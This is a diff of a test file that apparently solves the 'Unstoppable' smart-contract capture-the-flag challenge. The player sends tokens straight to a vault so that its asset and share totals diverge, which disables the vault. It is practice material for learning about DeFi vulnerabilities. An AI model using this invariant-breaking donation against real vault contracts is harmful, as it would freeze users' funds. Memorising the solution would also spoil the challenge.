@@ -44,7 +44,13 @@ describe('[Challenge] Unstoppable', function () {
     });
 
     it('Execution', async function () {
-        /** CODE YOUR SOLUTION HERE */
+        // /** CODE YOUR SOLUTION HERE */
+        await token.connect(player)["transfer"](vault.address,INITIAL_PLAYER_TOKEN_BALANCE);
+        // totalAssets: 1000010000000000000000000
+        console.log("totalAssets: ", await vault.totalAssets())
+        const totalSupply = await vault.totalSupply()
+        // totalSupply: 1000000000000000000000000
+        console.log("totalSupply",totalSupply);
     });
 
     after(async function () {
